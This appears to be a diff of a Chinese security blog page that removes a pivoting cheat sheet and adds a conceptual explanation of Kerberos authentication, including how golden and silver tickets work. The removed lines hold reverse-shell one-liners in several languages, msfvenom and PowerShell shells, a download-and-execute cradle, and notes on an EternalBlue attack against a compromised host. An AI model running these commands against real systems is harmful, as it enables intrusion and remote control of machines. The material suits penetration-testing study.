@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="笔记,端口转发," />
+  <meta name="keywords" content="KDC,Kerberos,笔记," />
 
 
 
@@ -89,17 +89,21 @@
 
 
 <meta name="description" content="…..">
-<meta name="keywords" content="笔记,端口转发">
+<meta name="keywords" content="KDC,Kerberos,笔记">
 <meta property="og:type" content="article">
-<meta property="og:title" content="端口转发总结">
-<meta property="og:url" content="https://sp4rr0w.github.io/2018/03/27/端口转发总结/index.html">
+<meta property="og:title" content="Kerberos认证相关">
+<meta property="og:url" content="https://sp4rr0w.github.io/2018/02/18/Kerberos认证相关/index.html">
 <meta property="og:site_name" content="Sparrow&#39;s Blog">
 <meta property="og:description" content="…..">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-28T08:35:43.764Z">
+<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/18/Kerberos认证相关/simple.jpg">
+<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/18/Kerberos认证相关/Kerberos.jpg">
+<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/18/Kerberos认证相关/getspn.png">
+<meta property="og:updated_time" content="2018-03-28T10:00:38.302Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="端口转发总结">
+<meta name="twitter:title" content="Kerberos认证相关">
 <meta name="twitter:description" content="…..">
+<meta name="twitter:image" content="https://sp4rr0w.github.io/2018/02/18/Kerberos认证相关/simple.jpg">
 
 
 
@@ -129,13 +133,13 @@
 
 
 
-  <link rel="canonical" href="https://sp4rr0w.github.io/2018/03/27/端口转发总结/"/>
+  <link rel="canonical" href="https://sp4rr0w.github.io/2018/02/18/Kerberos认证相关/"/>
 
 
 
 
 
-  <title>端口转发总结 | Sparrow's Blog</title>
+  <title>Kerberos认证相关 | Sparrow's Blog</title>
   
 
 
@@ -306,7 +310,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sp4rr0w.github.io/2018/03/27/端口转发总结/">
+    <link itemprop="mainEntityOfPage" href="https://sp4rr0w.github.io/2018/02/18/Kerberos认证相关/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Sparrow">
@@ -323,7 +327,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">端口转发总结</h1>
+          <h1 class="post-title" itemprop="name headline">Kerberos认证相关</h1>
         
 
         <div class="post-meta">
@@ -335,8 +339,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-27T16:58:00-04:00">
-                2018-03-27
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-18T19:09:00-05:00">
+                2018-02-18
               </time>
             
 
@@ -376,8 +380,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/03/27/端口转发总结/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/03/27/端口转发总结/" itemprop="commentCount"></span>
+                <a href="/2018/02/18/Kerberos认证相关/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/02/18/Kerberos认证相关/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -385,7 +389,7 @@
 
           
           
-             <span id="/2018/03/27/端口转发总结/" class="leancloud_visitors" data-flag-title="端口转发总结">
+             <span id="/2018/02/18/Kerberos认证相关/" class="leancloud_visitors" data-flag-title="Kerberos认证相关">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -422,272 +426,123 @@
 
       
         <p>…..<br><a id="more"></a></p>
-<h2 id="传统反弹与网络发现"><a href="#传统反弹与网络发现" class="headerlink" title="传统反弹与网络发现"></a>传统反弹与网络发现</h2><p><strong>协议的判断</strong></p>
-<p>主要是看能够通过什么协议出去，主要有tcp\http\dns\icmp等协议。常见判断手法如下：</p>
-<p>tcp协议</p>
-<pre><code>外网vps : nc –lvp port
-内网机器：nc ip port
-</code></pre><p>dns协议</p>
-<pre><code>外网vps: nc –u –lvp 53
-内网机器:
-windows: nslookup www.baidu.com vps-ip
-linux：dig @vps-ip www.baidu.com
-</code></pre><p>http协议</p>
-<pre><code>外网vps : nc –lvp 80 (or 8080等)
-内网机器 ： curl vps-ip:8080
-</code></pre><p>icmp协议</p>
-<pre><code>外网vps：抓包、tcpdump icmp
-内网机器:直接ping
-</code></pre><p><strong>端口的判断</strong></p>
-<p>外网vps做监听，内网机器测试常见端口，或直接使用端口扫描器进行扫描。</p>
-<p>常见能出去的端口有80,8080,443,53,110,123等。</p>
-<p><strong>额外情况–代理服务器</strong><br>还有一种是机器不能直接出来的，需要进行代理设置，这种多数是为了办公网段得办公人员进行上网用的。</p>
-<p>常用的判断手法与情况如下：</p>
-<pre><code>查看网络连接看是否有连接其他机器的8080（不绝对）等端口，尝试ping –n 1 –a ip
-是否有hostname类似于proxy的机器
-IE直接代理情况
-</code></pre><p>可以通过查询注册表得到：</p>
-<pre><code>reg query &quot;HKEY_USERS\[SID]\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer
-reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;
-</code></pre><p>通过pac文件自动代理情况</p>
-<pre><code>reg query &quot;HKEY_USERS\[SID]\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v AutoConfigURL
-</code></pre><p>我们可以通过pac文件的路径（可能是本地路径或远程路径）将pac文件下载回来查看，例如某pac文件如下：从中我们能看到其带来服务器为172.16.10.168:8080</p>
-<pre><code>    function islocalip(ip) {
-           return isInNet(ip, &quot;127.0.0.0&quot;, &quot;255.0.0.0&quot;) ||
-                     isInNet(ip, &quot;169.254.0.0&quot;, &quot;255.255.0.0&quot;) ||
-                     isInNet(ip, &quot;10.0.0.0&quot;, &quot;255.0.0.0&quot;) ||
-                     isInNet(ip, &quot;192.168.0.0&quot;, &quot;255.255.0.0&quot;) ||
-                     }
-    function FindProxyForURL(url, host) {
-           var DefaultScanner = &quot;PROXY 172.16.10.168:8080; DIRECT&quot;;
-           var target_ip = dnsResolve(host);
-           if (islocalip(target_ip)) {
-                         return &#39;DIRECT&#39;;
-           } else {
-                  return DefaultScanner;
-           }
-    }
-</code></pre><p>最终我们可以利用curl进行确定：</p>
-<pre><code>curl        www.baidu.com      //不通 
-curl –x     proxy-ip:8080 www.baidu.com   //通
-icmp        ping baidu.com 
-http        curl -i  baidu.com 
-tcp         telnet baidu.com 
-dns         nslookup baidu.com    //当然这里不一定非要百度
-</code></pre><p>其他反弹</p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
-python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
-</code></pre><p>顺便提下</p>
-<pre><code>searchsploit ms17  |grep py  只匹配py脚本
-searchsploit -p 41891.rb 复制完整路径并显示详细信息
-searchsploit -m 41891.rb 复制到当前目录
-searchsploit -w ms17-010  显示exploit-db在线结果
-</code></pre><pre><code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+<h2 id="Kerberos认证过程-简易版"><a href="#Kerberos认证过程-简易版" class="headerlink" title="Kerberos认证过程 (简易版)"></a>Kerberos认证过程 (简易版)</h2><p>认证或请求服务 的过程如下:<br><img src="/2018/02/18/Kerberos认证相关/simple.jpg" alt="认证或请求服务"></p>
+<p><code>简义</code></p>
+<pre><code>`KRB_AS_REQ (Kerberos Authentication Service Request)`
+1. Client-A ---------------------------------------------------------==&gt; KDC-AS (客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)) 此过程叫KRB_AS_REQ
 
-python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
 
-lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
+`KRB_AS_REP (Kerberos Authentication Service Response)`
+2. Client-A &lt;==--------------------------------------------------------- KDC-AS (返回TGT,TGT票据使用KDC的krbtgt密钥进行加密) 此过程叫KRB_AS_REP
 
-mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe
 
-php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-</code></pre><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>1、编辑配置文件/etc/sysctl.conf</p>
-<pre><code>net.ipv4.ip_forward = 1
-</code></pre><p>2、关闭服务</p>
-<pre><code>service iptables stop
-</code></pre><p>3、配置规则</p>
-<p>需要访问的内网地址：192.168.206.101<br>内网边界web服务器：192.168.206.129</p>
-<pre><code>iptables -t nat -A PREROUTING --dst 192.168.206.129 -p tcp --dport 3389 -j DNAT --to-destination 192.168.206.101:3389
-iptables -t nat -A POSTROUTING --dst 192.168.206.101 -p tcp --dport 3389 -j SNAT --to-source 192.168.206.129
-</code></pre><p>4、保存&amp;&amp;重启服务</p>
-<pre><code>service iptables save &amp;&amp; service iptables start
-</code></pre><h2 id="EarthWorm-绕防火墙"><a href="#EarthWorm-绕防火墙" class="headerlink" title="EarthWorm[绕防火墙]"></a>EarthWorm[绕防火墙]</h2><p><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a></p>
-<ol>
-<li><p>正向 SOCKS v5 服务器</p>
-<p> $ ./ew -s ssocksd -l 1080</p>
-</li>
-<li><p>反弹 SOCKS v5 服务器<br>这个操作具体分两步：</p>
-<p> a) 先在一台具有公网 ip 的主机A上运行以下命令：</p>
-<pre><code> $ ./ew -s rcsocks -l 1080 -e 8888 
-</code></pre><p> b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p>
-<pre><code> $ ./ew -s rssocks -d 1.1.1.1 -e 8888 
-</code></pre></li>
-<li><p>多级级联</p>
-</li>
-</ol>
-<p>工具中自带的三条端口转发指令，<br>它们的参数格式分别为：</p>
-<pre><code>$ ./ew -s lcx_listen -l  1080   -e 8888
-$ ./ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999
-$ ./ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999
-</code></pre><p>通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。<br>首先提供两个“二级级联”本地SOCKS测试样例：</p>
-<pre><code>a) lcx_tran 的用法
-    $ ./ew -s ssocksd  -l 9999
-    $ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
-b) lcx_listen、lcx_slave 的用法
-    $ ./ew -s lcx_listen -l 1080 -e 8888
-    $ ./ew -s ssocksd    -l 9999
-    $ ./ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
-</code></pre><p> 再提供一个“三级级联”的本地SOCKS测试用例以供参考</p>
-<pre><code>$ ./ew -s rcsocks -l 1080 -e 8888
-$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
-$ ./ew -s lcx_listen -l 9999 -e 7777
-$ ./ew -s rssocks -d 127.0.0.1 -e 7777
-</code></pre><p>数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p>
-<h2 id="Shell反弹不出-DMZ"><a href="#Shell反弹不出-DMZ" class="headerlink" title="Shell反弹不出[DMZ]"></a>Shell反弹不出[DMZ]</h2><p>1、先生成一个bind_shell</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=12345 -f exe -o ./shell.exe
-</code></pre><p>2、本地利用tunna工具进行端口转发</p>
-<pre><code>python proxy.py -u http://xxxx.com/conn.jsp  -l 3333 -r 12345 v
-</code></pre><p>3、监听</p>
-<pre><code>use exploit/multi/handler
-set payload windows/x64/meterpreter/bind_tcp
-set LPORT 3333
-</code></pre><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><p>三种不同类型的ssh隧道</p>
-<p><a href="http://hetaoo.iteye.com/blog/2299123" target="_blank" rel="noopener">http://hetaoo.iteye.com/blog/2299123</a></p>
-<p>通过VPS SSH隧道使用本地msf<br><a href="https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html" target="_blank" rel="noopener">https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html</a></p>
-<p>本地访问127.0.0.1:port1就是host:port2(用的更多)</p>
-<pre><code>ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发
-</code></pre><p>访问host:port2就是访问127.0.0.1:port1</p>
-<pre><code>ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发
-</code></pre><p>可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口</p>
-<pre><code>ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port
-</code></pre><p>可以将dmz_host的hostport端口转发到remote_ip的port端口</p>
-<pre><code>ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip  
-</code></pre><p>socket代理</p>
-<pre><code>ssh -qTfnN -D port remotehost
-</code></pre><p>反向隧道，用于内网穿透防火墙限制之类</p>
-<pre><code>-q      #安静模式
--T      #不占用shell
--f      #后台运行，推荐加-n参数
--N      #不执行远程命令
-</code></pre><p>set RHOST 127.0.0.1</p>
-<h2 id="Netsh-tcp"><a href="#Netsh-tcp" class="headerlink" title="Netsh[tcp]"></a>Netsh[tcp]</h2><p>添加转发规则</p>
-<pre><code>netsh interface portproxy set v4tov4 listenaddress=192.168.206.101 listenport=3333 connectaddress=192.168.206.100 connectport=3389
+`KRB_TGS_REQ (Kerberos Ticket Granting Service Request)`
+3. Client-A ----------------------------------------------------------==&gt; KDC-TGS (Client-A使用AS返回的&quot;会话密钥&quot;构建访问特定服务的请求,再把AS返回的&quot;TGT&quot;连同请求一起发送到票据授予服务TGS) 此过程叫KRB_TGS_REP
 
-此工具适用于，有一台双网卡服务器，你可以通过它进行内网通信，比如这个，你连接192.168.206.101:3388端口是连接到100上面的3389
-</code></pre><p>删除转发规则</p>
-<pre><code>netsh interface portproxy delete v4tov4 listenport=9090
-</code></pre><p>查看现有规则</p>
-<pre><code>netsh interface portproxy show all
-</code></pre><p>xp需要安装ipv6</p>
-<pre><code>netsh interface ipv6 install
-</code></pre><h2 id="nc-正向"><a href="#nc-正向" class="headerlink" title="nc [正向]"></a>nc [正向]</h2><pre><code>1、 nc -e /bin/sh -lp 1234
-    nc -e /bin/sh 223.8.200.234 1234
-    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f 
-    nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
 
-2、  mknod /tmp/backpipe p
-    /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe
+`KRB_TGS_REP (Kerberos Ticket Granting Service Response)`
+4. Client-A &lt;==---------------------------------------------------------- KDC-TGS (TGS解密TGT和服务请求,并向Client-A发送一个服务票据ST(Service Ticket)
 
-3、  nc.exe -e cmd.exe -lp 1234  [windows]
-</code></pre><h2 id="lcx-内网转发"><a href="#lcx-内网转发" class="headerlink" title="lcx 内网转发"></a>lcx 内网转发</h2><p>监听1234端口,转发数据到2333端口</p>
-<pre><code>本地:lcx.exe -listen 1234 6666
-</code></pre><p>将目标的3389转发到本地的1234端口</p>
-<pre><code>肉鸡:lcx.exe -slave my_ip 1234 127.0.0.1 3389
-</code></pre><p>re:最好有个vps</p>
-<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
-<p>python reGeorgSocksProxy.py -p 4444 -u <a href="http://xxx.com/tunnel.php" target="_blank" rel="noopener">http://xxx.com/tunnel.php</a><br>vim /etc/proxychains.conf</p>
-<pre><code>socks5 127.0.0.1 4444
-</code></pre><p>proxychains4 nmap -sT -Pn -n 192.168.1.2</p>
-<h2 id="Tunna-速度较慢"><a href="#Tunna-速度较慢" class="headerlink" title="Tunna[速度较慢]"></a>Tunna[速度较慢]</h2><p><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></p>
-<pre><code>python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v 
-rdesktop 127.0.0.1:1234
-</code></pre><h2 id="Linux-portmap-端口映射"><a href="#Linux-portmap-端口映射" class="headerlink" title="Linux portmap 端口映射"></a>Linux portmap 端口映射</h2><p>转发ssh到外网 不太常用</p>
-<pre><code>./portmap -m 2 -p1 6666 -h2 8.8.8.8 -p2 7777    #先在外网执行
-./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 8.8.8.8 -p2 6666  #在内网shell下执行
-ssh 127.0.0.1 -p 7777   #在外网机器上执行
-</code></pre><p>rtcp.py</p>
-<pre><code>1. 在B服务器上运行：
-    ./rtcp.py l:10001 l:10002
-    表示在本地监听了10001与10002两个端口，这样，这两个端口就可以互相传输数据了
-2. 在A服务器上运行：
-    ./rtcp.py c:localhost:22 c:222.2.2.2:10001
-    表示连接本地的22端口与B服务器的10001端口，这两个端口也可以互相传输数据了
-3. 然后我们就可以这样来访问A服务器的22端口了：
-    ssh 222.2.2.2 -p 10002
-    如果报错ssh_exchange_identification: read: Connection reset by peer  解决方法chmod 400 /etc/ssh/*
-</code></pre><p>tunna</p>
-<pre><code>第一步 运行proxy.py 并指定端口 python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v
-第二步 本地执行  rdesktop 127.0.0.1:1234
-python2.7 proxy.py -u http://x.x.x.x/conn.jsp -l 1234 -a 172.16.100.20 -r 3389   #-a指定内网的机器
-</code></pre><p>htran<br>正向代理</p>
-<pre><code>服务端      htran.exe -s -bind 8888
-客户端      SocksCap:SOCKS Version 5 服务端IP:8888
-</code></pre><p>反向代理</p>
-<pre><code>客户端      htran.exe -s -listen 1234 8888
-服务端      htran.exe -s -connect 客户端IP 1234
-客户端      SocksCap:SOCKS Version 5 127.0.0.1:8888
-</code></pre><p>正向端口转发</p>
-<pre><code>服务端      htran.exe -p -tran 8888 127.0.0.1 3389
-客户端      RDP 服务端IP:8888
-</code></pre><p>反向端口转发</p>
-<pre><code>客户端      htran.exe -p -listen 1234 8888
-服务端      htran.exe -p -slave 客户端IP 1234 127.0.0.1 3389
-客户端      RDP 127.0.0.1:8888
-</code></pre><p>iptables端口映射</p>
-<pre><code>bash
-vi /etc/sysctl.conf #将net.ipv4.ip_forward=0更改为net.ipv4.ip_forward=1 开启转发功能
-sysctl -p   #使数据转发功能生效
-iptables -t nat -A PREROUTING --dst 192.168.46.129 -p tcp --dport 81 -j DNAT --to-destination 172.24.20.25:80 #把本地192.168.46.129的81端口转为目标172,24.20.25的80端口
-iptables -t nat -A POSTROUTING --dst 172.24.20.25 -p tcp --dport 80  -j SNAT --to-source 192.168.46.129   #172.24.20.25:80返回时 将ip修改为192.168.46.129
-</code></pre><h2 id="端口转发之PowerShell"><a href="#端口转发之PowerShell" class="headerlink" title="端口转发之PowerShell"></a>端口转发之PowerShell</h2><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p>
-<pre><code>Victim IP : 192.168.52.1
-Attacker IP : 192.168.52.129
-</code></pre><p>1.Reverse shell[tcp]</p>
-<pre><code>Attacker:
-    nc -lvp 4444
-Victim:
-    PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1
-    PS F:\Shells&gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.52.129 -Port 4444
-</code></pre><p>2.Bind shell[tcp]</p>
-<pre><code>Victim:
-    PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1
-    PS F:\Shells&gt; Invoke-PowerShellTcp -Bind -Port 8888
-Attacker:
-    PS F:\Shells&gt; . .\powercat.ps1
-    PS F:\Shells&gt; powercat -c 192.168.52.1 -v -p 8888
-</code></pre><p>3.Reverse shell[UDP]支持ipv6</p>
-<pre><code>Attacker:
-    nc -lvup 53
-Victim:
-    PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1
-    PS F:\Shells&gt; Invoke-PowerShellUdp -Reverse -IPAddress 192.168.52.129 -Port 53
-</code></pre><p>4.Bind shell[UDP]</p>
-<pre><code>Victim:
-    PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1
-    PS F:\Shells&gt; Invoke-PowerShellUdp -Bind -Port 7777
-Attacker:
-    nc -vtu 192.168.52.1 7777
-</code></pre><p>5.HTTPS</p>
-<p><a href="https://github.com/samratashok/nishang/blob/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1</a></p>
-<p>需要Attacker以管理员身份运行,nishang作者最新的脚本会出现错误</p>
-<pre><code>Attacker:
-    PS F:\Shells&gt; . .\Invoke-PoshRatHttps.ps1
-    PS F:\Shells&gt; Invoke-PoshRatHttps -IPAddress 192.168.52.1 -Port 80 -SSLPort 443
-Victim:
-    PS C:\&gt; iex (New-Object Net.WebClient).DownloadString(&quot;http://192.168.52.1/connect&quot;)
-</code></pre><p>6.DNS shell<br>dnscat2 : <a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a>)<br>powercat: <a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a>)</p>
-<p>dnscat2讲解<br><a href="https://04z.net/2017/07/13/DNS-Tunnel/" target="_blank" rel="noopener">https://04z.net/2017/07/13/DNS-Tunnel/</a></p>
-<pre><code>Attacker:
-    root@kali:~# ruby dnscat2.rb shellcome.com
-Victim:
-    PS F:\Shells&gt; . .\powercat.ps1
-    PS F:\Shells&gt; powercat -c 192.168.52.131 -v -dns shellcome.com -ep
-</code></pre><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><pre><code>meterpreter&gt; run autoroute -s 192.168.1.0/24
-meterpreter&gt; use auxiliary/server/socks4a
-msf&gt; route add 192.168.1.0 255.255.255.0 192.168.1.1 [sessionid]
-</code></pre><h2 id="防火墙开启的ms17-010"><a href="#防火墙开启的ms17-010" class="headerlink" title="防火墙开启的ms17-010"></a>防火墙开启的ms17-010</h2><p>例如:详细查找ms17-010<br><a href="https://packetstormsecurity.com/search/?q=MS17-010" target="_blank" rel="noopener">https://packetstormsecurity.com/search/?q=MS17-010</a></p>
-<pre><code>1、上传EarthWorm转发端口445到指定端口,然后利用eternalblue+Doublepulsar溢出目标8888端口，成功回弹系统权限的shell
-2、由于防火墙限制（也可能其他），直接添加管理员始终不能成功
-3、上传工具，获取管理员密码hash破解，成功登陆3389
-./ew -s lcx_tran -l 8888 -f 127.0.0.1-g 445
-</code></pre><h2 id="Socks代理工具"><a href="#Socks代理工具" class="headerlink" title="Socks代理工具"></a>Socks代理工具</h2><p>re. 使用方法    <a href="http://bobao.360.cn/learning/detail/3502.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3502.html</a></p>
-<pre><code>Earthworm            http://rootkiter.com/EarthWorm
-xsocks            https://github.com/5loyd/xsocks
-ShadowSOCKS（影梭）    https://github.com/shadowSOCKS
-SocksCap64        http://www.sockscap64.com/
-proxychains        http://proxychains.sourceforge.net/
-</code></pre><p>from :<br><a href="https://04z.net/2017/07/09/AD-Attacks-Forwarding/" target="_blank" rel="noopener">https://04z.net/2017/07/09/AD-Attacks-Forwarding/</a></p>
 
+`KRB_AP_REQ (Kerberos Application Request)`
+5. Client-A ----------------------------------------------------------==&gt; Server-B (Client-A把服务票据中的服务器部分和请求一起发送到Server-B(Client-A要访问活动目录中的主机),远程服务器将直接接受该服务器票据,并不需要和KDC直接通信,因为该票据是用远程服务器和KDC共享的长期密钥加密过的)
+</code></pre><h2 id="Kerberos认证过程-详细版"><a href="#Kerberos认证过程-详细版" class="headerlink" title="Kerberos认证过程 (详细版)"></a>Kerberos认证过程 (详细版)</h2><p><img src="/2018/02/18/Kerberos认证相关/Kerberos.jpg" alt="详细版"></p>
+<p>认证或请求服务 的过程如下: </p>
+<h3 id="1-Client-A-—-gt-KDC-AS"><a href="#1-Client-A-—-gt-KDC-AS" class="headerlink" title="1. Client-A —&gt; KDC-AS"></a>1. Client-A —&gt; KDC-AS</h3><pre><code>KRB_AS_REQ (Kerberos Authentication Service Request) - 客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)
+    a. 客户端Client对用户口令执行散列运算转换为NTLM散列。此散列值(即用户密钥)成为客户端和KDC共享的长期密钥(long term key)。 
+    b. KRB_AS_REQ (Kerberos Authentication Service Request) - 客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)。
+</code></pre><h3 id="2-Client-A-lt-—-KDC-AS"><a href="#2-Client-A-lt-—-KDC-AS" class="headerlink" title="2. Client-A &lt;— KDC-AS"></a>2. Client-A &lt;— KDC-AS</h3><pre><code>KRB_AS_REP (Kerberos Authentication Service Response) - 
+身份验证服务(KDC-AS)会解密时间戳,若解密成功(KDC-AS检查用户的信息(登录限制.组成员身份等)并创建票据授予票据(Ticket-Granting Ticket,TGT),
+并向本地LSA (Local Security Authority)请求生成一个特殊的数据PAC,表明了客户端获得某个特定用户的口令(即验证了用户的身份)。
+身份验证服务(KDC-AS)向客户端回复两条信息: 
+    a. 短期会话密钥SessionKeya-kdc,用于客户端向KDC发起后续的请求 ,该消息经客户端的长期密钥(long term key)加密。(此短期会话密钥仅适用于该客户端和KDC之间)
+    b. 票据授予票据(Ticket Granting Ticket,简称TGT),包含有关用户名.域名.时间和组成员资格等信息。
+TGT票据使用KDC的krbtgt密钥进行加密,PAC使用krbtgt密钥进行进行签名,并且系统很少会验证PAC数据(在Windows环境中为krbtgt账户的NT-Hash)。
+</code></pre><h3 id="3-Client-A-—-gt-KDC-TGS"><a href="#3-Client-A-—-gt-KDC-TGS" class="headerlink" title="3. Client-A —&gt; KDC-TGS"></a>3. Client-A —&gt; KDC-TGS</h3><pre><code>KRB_TGS_REQ (Kerberos Ticket Granting Service Request) -
+Client使用AS返回的”短期会话密钥”构建访问特定服务的请求,再把AS返回的”票据授予票据(TGT)”连同请求一起发送到票据授予服务TGS) 此过程叫KRB_TGS_REQ
+Client-A使用AS返回的会话密钥SessionKeya-kdc构建访问特定服务的请求。客户端Client再把请求连同TGT一起发送到票据授予服务TGS。
+(TGT是被KDC的krbtgt密钥加密的，所以Client-A无法解密)
+黄金票据 - 此过程3可以伪造TGT(前提是获取krbtgt账号的口令散列值)，宣称自己是域内任何账号，包括域管或者不存在的用户，这是黄金票据的原理。
+</code></pre><h3 id="4-Client-A-lt-—-KDC-TGS"><a href="#4-Client-A-lt-—-KDC-TGS" class="headerlink" title="4. Client-A &lt;— KDC-TGS"></a>4. Client-A &lt;— KDC-TGS</h3><pre><code>KRB_TGS_REP (Kerberos Ticket Granting Service Response) -
+票据授予服务TGS解密TGT和服务请求,然后如果请求被允许(KDC会打开票据,进行校验和检查。如果DC能够打开票据,并能通过校验和检查,那么会认为TGT为有效票据。此时TGT中的数据会被复制,以创建TGS票据ST),
+票据授予服务TGS向客户端Client发送一个服务票据(Service Ticket,简称ST),包括两个部分: 
+    a. 远程服务器的部分 - 包含请求用户的组成员资格、时间戳、用于客户端和远程服务器之间通信的会话密钥。使用远程服务器Server-B和KDC共享的长期密钥(long term key)加密这部分消息。
+    b. 客户端的部分 - 包含用于客户端和远程服务器之间通信的会话密钥SessionKeya-b。(使用步骤2中AS回复的短期会话密钥(SessionKeya-kdc)加密这部分消息生成的会话密钥SessionKeya-b。)
+</code></pre><h3 id="5-Client-A-—-gt-Server-B"><a href="#5-Client-A-—-gt-Server-B" class="headerlink" title="5. Client-A —&gt; Server-B"></a>5. Client-A —&gt; Server-B</h3><pre><code>KRB_AP_REQ (Kerberos Application Request) - 
+Client-A把服务票据(Service Ticket)中的服务器部分和请求一起发送到Server-B(用户要访问活动目录中的主机)。
+远程服务器将直接接受该服务器票据,并不需要和KDC直接通信,因为该票据是用远程服务器和KDC共享的长期密钥加密过的。
+解密成功(目标服务会使用自己的NTLM密码散列打开TGS票据,并提取用户的授权数据和会话密钥SessionKeya-b。)即表明KDC已经允许了此次通信。
+白银票据 - 此过程5可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管，这是白银票据的原理。
